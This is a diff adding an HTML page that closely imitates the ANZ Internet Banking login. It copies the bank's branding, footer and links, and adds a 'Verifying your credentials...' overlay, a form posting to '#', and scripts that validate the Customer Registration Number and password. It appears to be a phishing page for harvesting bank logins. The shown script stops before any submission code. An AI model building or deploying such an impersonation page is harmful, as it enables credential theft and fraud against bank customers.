@@ -1,0 +1,545 @@
+<!DOCTYPE html> 
+<html class="no-js" lang="en">
+   <meta charset="utf-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <title>Login - ANZ Internet Banking</title>
+   <meta name="description" content="Web Login - ANZ Internet Banking">
+   <meta name="viewport" content="width=device-width,initial-scale=1">
+   <meta name="theme-color" content="#000000">
+   <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
+   <meta http-equiv="Pragma" content="no-cache">
+   
+   <style data-styled="active" data-styled-version="5.3.9">
+      @font-face{font-family:"Myriad pro";src:url(assets/asset_0001.woff)}
+      @font-face{font-family:myriad-pro-light;src:url(assets/asset_0002.woff)}
+      @font-face{font-family:myriad-pro-semibold;src:url(assets/asset_0003.woff)}
+      
+      /* Error message styles */
+      .error-message {
+         color: rgb(251, 113, 133);
+         font-size: 13px;
+         display: none;
+         margin-top: 6px;
+      }
+      .error-message.visible {
+         display: block;
+      }
+      .sc-eZYOHW.invalid {
+         border-color: rgb(251, 113, 133) !important;
+      }
+      
+      /* Loading overlay */
+      #loading-overlay {
+         display: none;
+         position: fixed;
+         top: 0;
+         left: 0;
+         width: 100%;
+         height: 100%;
+         background: rgba(255,255,255,0.9);
+         z-index: 9999;
+         justify-content: center;
+         align-items: center;
+         flex-direction: column;
+      }
+      .loader {
+         width: 50px;
+         height: 50px;
+         border: 4px solid rgb(240,240,240);
+         border-top-color: rgb(0,114,172);
+         border-radius: 50%;
+         animation: spin 1s linear infinite;
+      }
+      @keyframes spin {
+         to { transform: rotate(360deg); }
+      }
+      .loading-text {
+         margin-top: 16px;
+         color: rgb(73,73,73);
+         font-size: 14px;
+      }
+      
+      html{line-height:1.15;text-size-adjust:100%}
+      hr{box-sizing:content-box;height:0px;overflow:visible}
+      a{background-color:transparent}
+      img{border-style:none}
+      button,input{font-size:100%}
+      button,input{overflow:visible}
+      button{text-transform:none}
+      button,[type="submit"]{appearance:button}
+      [type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}
+      [type="search"]::-webkit-search-decoration{appearance:none}
+      ::-webkit-file-upload-button{appearance:button;font:inherit}
+      *,::after,::before{box-sizing:border-box}
+      html{font-family:"Myriad pro",sans-serif!important}
+      body{margin:0px;font-style:normal;font-weight:normal;font-variant:normal;text-transform:none;-webkit-font-smoothing:antialiased;line-height:1.25;letter-spacing:normal;min-width:320px;opacity:1!important;font-family:"Myriad pro",sans-serif!important;color:rgb(73,73,73)!important;font-size:16px!important}
+      body input,body button{margin:0px;line-height:1.25;font-family:inherit!important}
+      body a{text-decoration:none}
+      body a:hover,body a:focus{text-decoration:underline}
+      body input[type="number"]::-webkit-inner-spin-button,body input[type="number"]::-webkit-outer-spin-button{appearance:none;margin:0px}
+      body input:focus{outline:none}
+      body input:disabled{color:rgb(57,74,88);-webkit-text-fill-color:rgb(57,74,88)}
+      body select:disabled{color:rgb(57,74,88);-webkit-text-fill-color:rgb(57,74,88)}
+      .ddssys{margin-right:auto;margin-left:auto;padding-right:1rem;padding-left:1rem}
+      .ivvWlo{margin-right:auto;margin-left:auto;padding-right:1rem;padding-left:1rem}
+      @media only screen and (min-width:30em){.ivvWlo{width:48.1875rem}}
+      @media only screen and (min-width:48em){.ivvWlo{width:61rem}}
+      @media only screen and (min-width:60em){.ivvWlo{width:76rem}}
+      .bJFkTp{box-sizing:border-box;display:flex;flex:0 1 auto;flex-flow:wrap;margin-right:-1rem;margin-left:-1rem}
+      .lhmuJb{box-sizing:border-box;flex:0 0 auto;padding-right:1rem;padding-left:1rem}
+      @media only screen and (min-width:0em){.lhmuJb{flex-basis:100%;max-width:100%;display:block}}
+      .iIsFTj{box-sizing:border-box;flex:0 0 auto;padding-right:1rem;padding-left:1rem}
+      @media only screen and (min-width:0em){.iIsFTj{flex-basis:66.6667%;max-width:66.6667%;display:block}}
+      .jLcugL{box-sizing:border-box;flex:0 0 auto;padding-right:1rem;padding-left:1rem}
+      @media only screen and (min-width:0em){.jLcugL{flex-basis:33.3333%;max-width:33.3333%;display:block}}
+      .ivJuTg{box-sizing:border-box;flex:0 0 auto;padding-right:1rem;padding-left:1rem}
+      @media only screen and (min-width:0em){.ivJuTg{flex-basis:100%;max-width:100%;display:block}}
+      @media only screen and (min-width:30em){.ivJuTg{flex-basis:50%;max-width:50%;display:block}}
+      @media only screen and (min-width:48em){.ivJuTg{flex-basis:100%;max-width:100%;display:block}}
+      @media only screen and (min-width:60em){.ivJuTg{flex-basis:100%;max-width:100%;display:block}}
+      .gwXRSe{max-width:100%;margin:0px auto;transition:max-width 0.2s;padding:0px}
+      .hnTawa{max-width:100%;margin:0px auto;transition:max-width 0.2s;padding:0px 15px}
+      .jgiKyF{margin:0px -15px 40px}
+      @media screen and (max-width:767px){.jgiKyF{margin-bottom:32px}}
+      .kmmHCZ{margin:0px -15px 32px}
+      .bKxQvw{margin:0px -15px 16px}
+      @media screen and (max-width:767px){.bKxQvw{margin-bottom:16px}}
+      .euzfGQ{margin:0px -15px}
+      @media screen and (max-width:767px){.euzfGQ{margin-bottom:0px}}
+      .jgiKzM{margin:0px -15px 40px}
+      @media screen and (max-width:767px){.jgiKzM{margin-bottom:40px}}
+      .fjIFHw{margin:0px -15px 12px}
+      @media screen and (max-width:767px){.fjIFHw{margin-bottom:12px}}
+      .gOkwLz{padding:0px 15px}
+      .cVLjKh{display:flex;flex-direction:column;min-height:100vh}
+      .ccpVJd{display:flex;flex-direction:column;-webkit-box-pack:center;justify-content:center;flex:1 0 auto}
+      .iFhILj{display:flex;flex-direction:column;-webkit-box-pack:center;justify-content:center;flex:1 0 auto}
+      .gFLHhZ{margin:48px auto;max-width:100%}
+      @media screen and (max-width:767px){.gFLHhZ{margin:0px auto;max-width:100%}}
+      @media screen and (max-width:479px){.gFLHhZ{margin:0px auto;width:100%}}
+      @media screen and (max-width:767px){.gHEvnd{padding:48px 15px;margin:0px;width:100%}}
+      .cImUDV{min-height:330px;background-color:rgb(255,255,255);border:1px solid rgb(226,228,230);border-radius:3px}
+      .hKgETy{min-height:auto;background-color:rgb(255,255,255);border:none;border-radius:3px}
+      .gGeVXk{max-width:560px}
+      @media screen and (max-width:767px){.gGeVXk{border:none}}
+      .krPYpk{margin:0px;padding-left:32px;padding-right:32px}
+      @media screen and (max-width:959px){.krPYpk{padding-left:24px;padding-right:24px}}
+      @media screen and (max-width:767px){.krPYpk{padding-left:16px;padding-right:16px}}
+      @media screen and (max-width:479px){.krPYpk{padding-left:24px;padding-right:24px}}
+      .hWooqm{max-width:100%;margin:0px;padding-left:32px;padding-right:32px}
+      @media screen and (max-width:959px){.hWooqm{max-width:100%;padding-left:24px;padding-right:24px}}
+      @media screen and (max-width:767px){.hWooqm{max-width:100%;padding-left:16px;padding-right:16px}}
+      @media screen and (max-width:479px){.hWooqm{max-width:100%;padding-left:24px;padding-right:24px}}
+      .ghLwVM{width:100%;margin:0px;background-color:rgb(0,114,172);color:rgb(255,255,255);border:1px solid transparent;border-radius:4px;font-weight:600;padding:12px;cursor:pointer;transition:background-color 0.2s,border-color 0.2s,color 0.2s;font-family:myriad-pro-semibold,sans-serif,sans-serif!important}
+      .ghLwVM:disabled{cursor:not-allowed}
+      .ghLwVM:focus,.ghLwVM:hover{outline:none;background-color:rgb(0,147,216)}
+      .ghLwVM svg{margin-right:8px}
+      @media screen and (max-width:767px){.gimCyN{padding-left:24px;padding-right:24px}}
+      @media screen and (max-width:479px){.gimCyN{padding-left:16px;padding-right:16px}}
+      .hRUSFs{color:rgb(0,114,172);-webkit-tap-highlight-color:transparent}
+      .hRUSFs:hover,.hRUSFs:focus{cursor:pointer;text-decoration:underline!important}
+      .zxacp{color:rgb(0,114,172);-webkit-tap-highlight-color:transparent}
+      .zxacp:hover,.zxacp:focus{cursor:pointer;text-decoration:underline!important}
+      .lhlMLi{color:transparent;-webkit-tap-highlight-color:transparent}
+      .lhlMLi:hover,.lhlMLi:focus{cursor:pointer}
+      .laohtG{display:inherit;margin-bottom:0px;padding:0px;text-align:inherit;font-size:inherit;letter-spacing:inherit;line-height:inherit;gap:normal}
+      .kZVtjJ{padding:64px;margin-top:0px;width:100%}
+      @media screen and (max-width:767px){.kZVtjJ{width:100%;max-width:100%;margin:0px;padding:0px}}
+      .ekAURR{padding:0px;margin-top:64px;width:100%}
+      @media screen and (max-width:767px){.ekAURR{width:100%;max-width:100%;margin:0px;padding:0px}}
+      .igYiSn{padding:0px;margin-top:0px;width:100%}
+      @media screen and (max-width:767px){.igYiSn{width:100%;max-width:100%;margin:0px;padding:0px}}
+      .iTYCHi{position:relative;z-index:9;width:100%;top:0px}
+      .hIHVjc{height:60px;width:100%;background-color:rgb(0,65,101)}
+      .cJcUkO{width:103px;height:42px;margin-top:10px}
+      .gCxIsh{width:100%;bottom:0px}
+      .dEEDDG{width:100%;background-color:rgb(0,114,172);color:rgb(255,255,255);padding-top:32px;padding-bottom:32px}
+      .jrBPNq{white-space:nowrap}
+      .hcAbZl{color:rgb(255,255,255)}
+      .ckgWdC{font-size:16px;transition:font-size 0.2s,transform 0.2s,color 0.2s;display:inline-block}
+      .ejVLex{position:relative;z-index:0;color:rgb(116,118,120);width:100%}
+      .bYZcVK{width:100%;padding:0px 24px 0px 12px;background-color:transparent;border:1px solid rgb(204,204,204);border-radius:4px;transition:border-color 0.2s,height 0.2s,line-height 0.2s,font-size 0.2s,padding 0.2s;font-size:16px;color:rgb(73,73,73);height:44px}
+      .gwFQUt{position:relative}
+      .XJGkH{position:absolute;right:0px;bottom:0px;overflow:hidden;padding:12px;transition:font-size 0.2s,padding 0.2s}
+      .lKGmN{overflow:hidden;height:0px;margin:0px}
+      .bgsKsR{background:rgb(240,250,255);border:1px solid rgb(147,199,229);border-radius:3px;display:block;padding:16px;font-size:14px}
+      .jjAtNs{font-size:16px;line-height:1.25;letter-spacing:0.2px}
+      .dREWKT{font-size:14px;line-height:1.429;letter-spacing:0px}
+      .fqlrBo{font-family:myriad-pro-semibold,sans-serif,sans-serif}
+      .fgawqS{margin:0px;text-align:left;font-weight:600;line-height:1.125;letter-spacing:normal;color:rgb(0,65,101);font-size:30px;font-family:myriad-pro-light,sans-serif!important}
+      @media screen and (max-width:959px){.fgawqS{font-size:28px}}
+      @media screen and (max-width:479px){.fgawqS{text-align:center!important}}
+      .fgawqS:focus{outline:none}
+      .dcvYBX{margin:10px 0px 15px;border-width:1px 0px 0px;border-right-style:initial;border-bottom-style:initial;border-left-style:initial;border-right-color:initial;border-bottom-color:initial;border-left-color:initial;border-image:initial;border-top-style:solid;border-top-color:rgb(204,204,204)}
+      @media screen and (max-width:767px){.dcvYBX{margin-left:0px;margin-right:0px}}
+      @media screen and (max-width:479px){.dcvYBX{margin-left:0px;margin-right:0px}}
+      .wDxqd{margin-top:56px;margin-bottom:32px}
+      .iNkZM label{color:rgb(73,73,73);margin-bottom:4px;letter-spacing:normal}
+      .dqmttE{text-align:right;position:relative;width:100%}
+      .jgqMpv{text-align:left;position:relative;width:100%}
+      @media screen and (max-width:479px){.jgqMpv{text-align:center!important}}
+      .eGZRyh{color:rgb(0,65,101);font-weight:600}
+      .eZrkKP{display:flex;-webkit-box-pack:center;justify-content:center}
+      @media screen and (max-width:767px){.eZrkKP{display:block}}
+      .gsrDOo{width:553px;margin-right:127px}
+      @media screen and (max-width:1163px){.gsrDOo{width:530px;margin-right:30px}}
+      @media screen and (max-width:959px){.gsrDOo{width:418px;margin-right:30px}}
+      @media screen and (max-width:767px){.gsrDOo{width:100%}}
+      .szBhK{width:260px}
+      @media screen and (max-width:1163px){.szBhK{width:210px}}
+      @media screen and (max-width:959px){.szBhK{width:226px;margin-right:64px}}
+      @media screen and (max-width:767px){.szBhK{width:100%;margin-top:64px}}
+      .gqFOmt{width:100%;display:block}
+      .bhvnUz{font-size:16px;font-weight:600;line-height:1.5;color:rgb(0,65,101)}
+      .bhvnUz a:hover,.bhvnUz a:focus{text-decoration:none!important}
+      .cfQyeV{color:rgb(0,125,186);text-decoration:none;border:1px solid rgb(0,125,186);font-size:14px;font-weight:600;border-radius:3px;cursor:pointer;line-height:18px;text-align:center;display:inline-block;padding:5px 11px}
+      .cfQyeV:hover,.cfQyeV:focus{text-decoration:none!important}
+      .ifFuvk{margin-bottom:56px}
+      @media screen and (max-width:767px){.ifFuvk{margin-bottom:0px}}
+      @media screen and (max-width:479px){.ifFuvk{margin-bottom:56px}}
+      .QOZbm{transform:translate3d(0px,0.125em,0px);margin:-0.125em 0px 0px}
+      .cOdLOh{position:fixed;inset:0px;opacity:0;transform:translate3d(-100%,0px,0px);z-index:999;transition:opacity 0.2s}
+      .eGxITm{position:fixed;inset:0px;display:flex;overflow-y:auto;padding:48px 8px}
+      @media screen and (min-width:768px){.eGxITm{overflow-y:auto}}
+      @media screen and (max-width:768px){.eGxITm{display:flex}}
+      .bXSECG{position:fixed;inset:0px;background:rgba(89,89,89,0.498)}
+      .hJgBvX:focus{outline:none}
+      .jOQVzB{position:relative;inset:auto;background:rgb(244,243,244);padding:0px;max-width:660px;margin:auto;box-shadow:rgba(0,0,0,0.08) 0px 4px 16px 0px,rgba(0,0,0,0.08) 0px 8px 32px 0px;overflow-y:visible;border-radius:16px;transform:translateY(100vh);transition:transform 0.2s;flex:1 1 0%}
+      .jOQVzB:focus,.jOQVzB:focus-visible{outline:none}
+      @media screen and (min-width:768px){.jOQVzB{position:static;inset:auto;margin:auto;transform:scale(0);flex:0 0 auto}}
+      .iLbRpb:focus{outline:none}
+      .dTBnFl li::before{content:counter(list-item);width:21px;height:21px;border-radius:50%;border:1px solid rgb(5,114,230);color:rgb(5,114,230);display:inline-flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;position:absolute;left:0px;margin-top:2px}
+      .iQHsjJ:disabled{cursor:not-allowed}
+      .iQHsjJ:focus,.iQHsjJ:hover{outline:none;color:rgb(0,86,178);border:1px solid rgb(0,86,178);text-decoration:underline}
+      .xdAQK:hover,.xdAQK:focus{text-decoration:none!important}
+      .xdAQK:hover div,.xdAQK:focus div{background-color:rgb(250,250,250)}
+      .cYoioj:focus{outline:none}
+      .kufEDP:hover,.kufEDP:focus{background-color:rgb(250,250,250);text-decoration:none!important}
+      @-webkit-keyframes hFUWbh{0%{margin-top:200px;display:none;transform:scale(0)}1%{transform:scale(1)}100%{margin-top:0px;display:block;transform:scale(1)}}
+      @keyframes hFUWbh{0%{margin-top:200px;display:none;transform:scale(0)}1%{transform:scale(1)}100%{margin-top:0px;display:block;transform:scale(1)}}
+      @font-face{font-family:Aeonik;src:url(assets/asset_0004.woff2)format("woff2");font-weight:normal;font-style:normal}
+      @font-face{font-family:Aeonik;src:url(assets/asset_0005.woff2)format("woff2");font-weight:normal;font-style:italic}
+      @font-face{font-family:Aeonik;src:url(assets/asset_0006.woff2)format("woff2");font-weight:300;font-style:normal}
+      @font-face{font-family:Aeonik;src:url(assets/asset_0007.woff2)format("woff2");font-weight:300;font-style:italic}
+      body .anzx-container{font-family:Aeonik,sans-serif;color:rgb(66,66,66);font-style:normal;font-weight:normal;font-variant:normal;text-transform:none;font-size:16px;line-height:24px;letter-spacing:0px}
+      @media screen and (max-width:959px){body .anzx-container{font-size:16px;line-height:24px;letter-spacing:0px}}
+      @media screen and (max-width:767px){body .anzx-container{font-size:16px;line-height:24px;letter-spacing:0px}}
+      body .anzx-container a:link,body .anzx-container a:visited{color:rgb(0,107,222);text-decoration:underline}
+      body .anzx-container a:focus,body .anzx-container a:link:focus,body .anzx-container a:visited:focus,body .anzx-container a:hover,body .anzx-container a:link:hover,body .anzx-container a:visited:hover{color:rgb(0,86,178)}
+      body .anzx-container a:active,body .anzx-container a:link:active,body .anzx-container a:visited:active{color:rgb(0,64,133)}
+   </style>
+   
+   <meta name="referrer" content="no-referrer">
+   <link rel="icon" href="assets/asset_0008.bin">
+   <style>.sf-hidden{display:none!important}</style>
+   <link rel="canonical" href="https://login.anz.com/internetbanking">
+   <meta http-equiv="content-security-policy" content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
+   
+   <body style="overflow:auto">
+      <!-- Loading Overlay -->
+      <div id="loading-overlay">
+         <div class="loader"></div>
+         <div class="loading-text">Verifying your credentials...</div>
+      </div>
+
+      <div id="root" class="pageContainer" aria-hidden="false">
+         <div class="sc-jsMahE cVLjKh">
+            <header class="sc-iCmkLe iTYCHi">
+               <div data-test-id="header-section" class="sc-ehsgIH hIHVjc">
+                  <span class="sc-ieZDjg krPYpk">
+                     <a data-test-id="home-anz-link" href="https://www.anz.com.au/personal/" title="ANZ Logo" class="sc-kMrHXl lhlMLi">
+                        <img data-test-id="header-logo" src="assets/asset_0009.svg" alt="ANZ logo" class="sc-cRZddA cJcUkO">
+                     </a>
+                  </span>
+               </div>
+            </header>
+            
+            <main class="sc-kFuwaP ccpVJd">
+               <div class="sc-irTswW sc-fbJfA sc-brKeYL iFhILj gFLHhZ gHEvnd">
+                  <div class="sc-kZCGdI eZrkKP">
+                     <div data-test-id="column-1" class="sc-yJYNr gsrDOo">
+                        <div class="sc-ktEKTO sc-hAtEyd sc-iVFRtF cImUDV gGeVXk kZVtjJ">
+                           <div class="sc-beqWaB sc-hLseeU ddssys gwXRSe">
+                              <div class="sc-gueYoa sc-eDDNvR bJFkTp jgiKyF">
+                                 <div class="sc-dmqHEX sc-jTrPJq lhmuJb gOkwLz">
+                                    <h1 data-test-id="login-header-test-id" id="login-header" tabindex="-1" font-size="30px" font-weight="600" class="sc-eFqGBh fgawqS">
+                                       <span role="text" class="sc-bYOEQd fqlrBo">
+                                          Log in to 
+                                          <div>ANZ Internet Banking</div>
+                                       </span>
+                                    </h1>
+                                 </div>
+                              </div>
+                              
+                              <form id="login-form" action="#" aria-describedby="login-header" method="post" novalidate>
+                                 <div id="live-container">
+                                    <!-- CRN Field -->
+                                    <div class="sc-gueYoa sc-eDDNvR bJFkTp kmmHCZ">
+                                       <div class="sc-dmqHEX sc-jTrPJq lhmuJb gOkwLz">
+                                          <div class="sc-cbelXg laohtG">
+                                             <div class="sc-cmEail ejVLex sc-dlUsjx iNkZM" data-test-id="customerRegistrationNumber_wrapper">
+                                                <label data-test-id="customerRegistrationNumber_label" for="customerRegistrationNumber" class="sc-ejdXBC ckgWdC">Customer Registration Number</label>
+                                                <div data-test-id="customerRegistrationNumber_info" class="sc-jJgynQ lKGmN">
+                                                   <div data-test-id="customerRegistrationNumber_info_text" class="sc-bbpGSz bgsKsR"></div>
+                                                </div>
+                                                <div class="sc-fYdXmn gwFQUt">
+                                                   <input id="customerRegistrationNumber" name="customerRegistrationNumber" type="tel" maxlength="9" data-test-id="customerRegistrationNumber_input" placeholder="" autocomplete="off" aria-describedby="crn-error" class="sc-eZYOHW bYZcVK" value="">
+                                                   <span value="" class="sc-UxxwN XJGkH"></span>
+                                                </div>
+                                                <div id="crn-error" class="error-message" role="alert"></div>
+                                             </div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                    
+                                    <!-- Password Field -->
+                                    <div class="sc-gueYoa sc-eDDNvR bJFkTp kmmHCZ">
+                                       <div class="sc-dmqHEX sc-jTrPJq lhmuJb gOkwLz">
+                                          <div class="sc-cmEail ejVLex sc-dlUsjx iNkZM" data-test-id="password_wrapper">
+                                             <label data-test-id="password_label" for="password" class="sc-ejdXBC ckgWdC">Password</label>
+                                             <div data-test-id="password_info" class="sc-jJgynQ lKGmN">
+                                                <div data-test-id="password_info_text" class="sc-bbpGSz bgsKsR"></div>
+                                             </div>
+                                             <div class="sc-fYdXmn gwFQUt">
+                                                <input id="password" name="password" type="password" maxlength="32" data-test-id="password_input" placeholder="" autocomplete="off" aria-describedby="password-error" class="sc-eZYOHW bYZcVK">
+                                                <span value="" class="sc-UxxwN XJGkH"></span>
+                                             </div>
+                                             <div id="password-error" class="error-message" role="alert"></div>
+                                          </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                                 
+                                 <!-- Submit Button -->
+                                 <div class="sc-gueYoa sc-eDDNvR bJFkTp kmmHCZ">
+                                    <div class="sc-dmqHEX sc-jTrPJq lhmuJb gOkwLz">
+                                       <button type="submit" id="login-btn" data-test-id="log-in-btn" font-weight="600" class="sc-cyRfQX ghLwVM">
+                                          <span role="text">
+                                             <svg viewBox="0 0 16 16" width="1em" height="1em" class="sc-jYvNne QOZbm">
+                                                <path d="M13.585 6.209h-.89V4.695A4.7 4.7 0 0 0 8 0a4.7 4.7 0 0 0-4.695 4.695V6.21h-.89a.296.296 0 0 0-.296.297v9.198c0 .162.133.295.297.295h11.169a.296.296 0 0 0 .296-.297V6.506a.297.297 0 0 0-.296-.297zm-8.28-1.514A2.698 2.698 0 0 1 8 2a2.698 2.698 0 0 1 2.695 2.695V6.21h-5.39V4.695zm3.57 5.98v2.368a.874.874 0 0 1-1.748 0v-2.367a1.342 1.342 0 0 1-.484-1.024c0-.749.61-1.358 1.358-1.358.749 0 1.358.61 1.358 1.358 0 .395-.18.768-.484 1.023z" fill="currentColor"></path>
+                                             </svg>
+                                             Log in
+                                          </span>
+                                       </button>
+                                    </div>
+                                 </div>
+                              </form>
+                              
+                              <div class="sc-gueYoa sc-eDDNvR bJFkTp kmmHCZ">
+                                 <div class="sc-dmqHEX sc-jTrPJq iIsFTj gOkwLz">
+                                    <a data-test-id="forgot-login-details-link" href="https://www.recovery.anz.com/recover/do-you-know-your-crn" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Forgot login details?</a>
+                                 </div>
+                                 <div class="sc-dmqHEX sc-jTrPJq jLcugL gOkwLz">
+                                    <div class="sc-vjKnw dqmttE">
+                                       <a data-test-id="help-link" rel="noopener" class="sc-eACynP hRUSFs" href="https://login.anz.com/internetbanking/help">Help</a>
+                                    </div>
+                                 </div>
+                              </div>
+                              
+                              <hr aria-hidden="true" class="sc-gHbYXZ sc-etAVug dcvYBX wDxqd">
+                              
+                              <div class="sc-gueYoa sc-eDDNvR bJFkTp jgiKzM">
+                                 <div class="sc-dmqHEX sc-jTrPJq lhmuJb gOkwLz">
+                                    <div class="sc-bjMMwb jgqMpv">
+                                       <span data-test-id="register-text-test-id" class="sc-dskThN jjAtNs">
+                                          <span>New to Internet Banking? </span>
+                                          <a data-test-id="register-link" href="https://register.anz.com/internetbanking" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Register</a>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                              
+                              <div class="sc-gueYoa sc-eDDNvR bJFkTp euzfGQ">
+                                 <div class="sc-dmqHEX sc-jTrPJq lhmuJb gOkwLz">
+                                    <div class="sc-bjMMwb jgqMpv">
+                                       <span data-test-id="logging-in-text" class="sc-faCEWe dREWKT">
+                                          <span>By logging in, you accept our 
+                                             <a data-test-id="security-and-privacy-statement-link" href="https://www.anz.com.au/privacy/centre/security-privacy/" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Security and Privacy Statement.</a>
+                                          </span>
+                                       </span>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                     
+                     <div data-test-id="column-2" class="sc-dXoxLi szBhK">
+                        <div class="sc-ktEKTO sc-hAtEyd sc-iVFRtF hKgETy gGeVXk ekAURR">
+                           <div class="sc-beqWaB sc-hLseeU ivvWlo gwXRSe">
+                              <div class="sc-gueYoa sc-eDDNvR bJFkTp euzfGQ">
+                                 <div data-test-id="sub-column-1" class="sc-dmqHEX sc-jTrPJq sc-GJyyB ivJuTg gOkwLz ifFuvk">
+                                    <div id="acquisition-area" data-test-id="acquisition-area" class="sc-ktEKTO sc-hAtEyd sc-iVFRtF hKgETy gGeVXk igYiSn">
+                                       <a href="https://www.anz.com.au/support?pid=glo-ibl-td-ib-04-21-ser-support" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">
+                                          <img src="assets/asset_0010.svg" alt="ib login support" class="sc-jFJHMl gqFOmt">
+                                       </a>
+                                       <p class="sc-bOSxlg bhvnUz">
+                                          <a href="https://www.anz.com.au/support?pid=glo-ibl-td-ib-04-21-ser-support" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">
+                                             <span role="text" class="sc-bYOEQd fqlrBo">Have a question about a product or service of ours?</span>
+                                          </a>
+                                       </p>
+                                       <a href="https://www.anz.com.au/support?pid=glo-ibl-td-ib-04-21-ser-support" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps sc-fYzRkI zxacp cqutLQ cfQyeV">
+                                          <span role="text" class="sc-bYOEQd fqlrBo">Visit ANZ Support</span>
+                                       </a>
+                                    </div>
+                                 </div>
+                                 
+                                 <div data-test-id="sub-column-2" class="sc-dmqHEX sc-jTrPJq ivJuTg gOkwLz">
+                                    <div class="sc-ktEKTO sc-hAtEyd sc-iVFRtF hKgETy gGeVXk igYiSn">
+                                       <div class="sc-beqWaB sc-hLseeU ivvWlo hnTawa">
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp bKxQvw">
+                                             <span role="text" data-test-id="login-help-link-header-test-id" id="login-help-link-header" class="sc-bYOEQd fqlrBo">
+                                                <div font-weight="600" class="sc-bjMMwb sc-eIrltS jgqMpv eGZRyh">Further information</div>
+                                             </span>
+                                          </div>
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp fjIFHw">
+                                             <a data-test-id="whats_new_ib-link" href="https://www.anz.com.au/ways-to-bank/internet-banking/personal/whats-new/" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">What's new</a>
+                                          </div>
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp fjIFHw">
+                                             <a data-test-id="find_or_change_crn_password-link" href="https://www.anz.com.au/support/customer-registration-number-password/" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Find or change your CRN and Password</a>
+                                          </div>
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp fjIFHw">
+                                             <a data-test-id="view_statements-link" href="https://www.anz.com.au/support/statements/" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">View statements</a>
+                                          </div>
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp fjIFHw">
+                                             <a data-test-id="get_or_change_your_card_pin-link" href="https://www.anz.com.au/personal/credit-cards/using/managing/#changepin" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Get or change your card PIN</a>
+                                          </div>
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp fjIFHw">
+                                             <a data-test-id="latest_security_alerts-link" href="https://www.anz.com.au/security/fraud-detection/latest-security-alerts/" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Latest security alerts</a>
+                                          </div>
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp fjIFHw">
+                                             <a data-test-id="privacy_centre-link" href="https://www.anz.com.au/privacy/centre/" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Privacy Centre</a>
+                                          </div>
+                                          <div class="sc-gueYoa sc-eDDNvR bJFkTp fjIFHw">
+                                             <a data-test-id="contact_us-link" href="https://www.anz.com.au/support/contact-us/" rel="noopener" target="_blank" class="sc-bZPPFW sc-ilEZps zxacp cqutLQ">Contact us</a>
+                                          </div>
+                                       </div>
+                                    </div>
+                                 </div>
+                              </div>
+                           </div>
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </main>
+            
+            <footer class="sc-jMAIzZ gCxIsh">
+               <div class="sc-dQelHR dEEDDG">
+                  <div class="sc-irTswW sc-fbJfA sc-dKfzgJ iFhILj gFLHhZ hWooqm">
+                     <span class="sc-cPlDXj hcAbZl">
+                        <div data-test-id="footer-details" class="sc-lnAgIa gimCyN">© Australia and New Zealand Banking Group Limited (ANZ) 2026<span class="sc-bCDidY jrBPNq"> ABN 11 005 357 522.</span></div>
+                     </span>
+                  </div>
+               </div>
+            </footer>
+         </div>
+      </div>
+
+      <script>
+         document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('login-form');
+            const crnInput = document.getElementById('customerRegistrationNumber');
+            const passwordInput = document.getElementById('password');
+            const loadingOverlay = document.getElementById('loading-overlay');
+            const loginBtn = document.getElementById('login-btn');
+            
+            // Helper: Show/hide error
+            const showError = (input, errorId, show) => {
+               const errorEl = document.getElementById(errorId);
+               if (show) {
+                  input.classList.add('invalid');
+                  errorEl.classList.add('visible');
+               } else {
+                  input.classList.remove('invalid');
+                  errorEl.classList.remove('visible');
+               }
+            };
+            
+            // Validate CRN (exactly 9 digits)
+            const validateCRN = () => {
+               const value = crnInput.value.trim();
+               // Must be exactly 9 digits
+               const regex = /^\d{9}$/;
+               
+               if (!regex.test(value)) {
+                  showError(crnInput, 'crn-error', true);
+                  return false;
+               }
+               showError(crnInput, 'crn-error', false);
+               return true;
+            };
+            
+            // Validate Password (8-32 chars, at least one letter and one number)
+            const validatePassword = () => {
+               const value = passwordInput.value;
+               
+               // Check length (8-32 characters)
+               if (value.length < 8 || value.length > 32) {
+                  showError(passwordInput, 'password-error', true);
+                  return false;
+               }
+               
+               // Check for at least one letter
+               const hasLetter = /[a-zA-Z]/.test(value);
+               // Check for at least one number
+               const hasNumber = /\d/.test(value);
+               
+               if (!hasLetter || !hasNumber) {
+                  showError(passwordInput, 'password-error', true);
+                  return false;
+               }
+               
+               showError(passwordInput, 'password-error', false);
+               return true;
+            };
+            
+            // Format CRN (digits only, max 9)
+            crnInput.addEventListener('input', (e) => {
+               let value = e.target.value.replace(/\D/g, '');
